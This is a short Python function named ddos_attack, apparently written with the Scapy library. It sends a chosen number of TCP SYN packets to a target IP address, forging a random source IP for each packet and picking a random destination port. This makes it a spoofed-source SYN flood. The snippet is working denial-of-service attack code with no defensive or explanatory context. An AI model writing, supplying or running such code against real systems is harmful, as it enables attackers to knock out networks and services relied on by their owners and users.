def ddos_attack(target_ip, num_packets):
    for i in range(num_packets):
        # Generate a random source IP address
        src_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        # Create a packet with a random source IP and target IP
        packet = IP(src=src_ip, dst=target_ip) / TCP(dport=random.randint(1, 65535), flags="S")
        send(packet, verbose=0)

